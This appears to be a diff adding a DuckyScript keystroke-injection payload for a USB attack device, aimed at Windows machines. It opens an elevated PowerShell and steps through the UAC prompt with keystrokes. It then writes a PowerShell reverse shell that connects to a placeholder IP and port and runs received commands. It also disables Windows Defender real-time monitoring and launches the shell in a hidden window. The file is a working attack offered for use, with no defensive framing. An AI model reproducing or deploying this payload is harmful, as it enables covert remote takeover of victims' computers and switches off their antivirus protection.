@@ -1,0 +1,33 @@
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+GUI TAB
+DELAY 750
+LEFTARROW
+DELAY 750
+SPACE
+DELAY 750
+LEFTARROW
+DELAY 750
+SPACE
+DELAY 750
+ENTER
+ALT SPACE
+DELAY 1000
+STRING m
+DELAY 1000
+DOWNARROW
+REPEAT 100
+ENTER
+STRING Add-Content "$env:TEMP\34593.ps1" '$sm = (New-Object System.Net.Sockets.TCPClient("Enter IP address here",Port goes here)).GetStream();[byte[]]$bt = 0..65535|%{0};while(($i = $sm.Read($bt, 0, $bt.Length)) -ne 0){;$d = (New-Object System.Text.ASCIIEncoding).GetString($bt,0, $i);$st = ([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length);$s.Flush()};$c.Close()'
+ENTER
+DELAY 750
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+DELAY 500
+ENTER
+DELAY 750
+STRING start-Process powershell.exe -windowstyle hidden “$env:TEMP\34593.ps1”
+ENTER
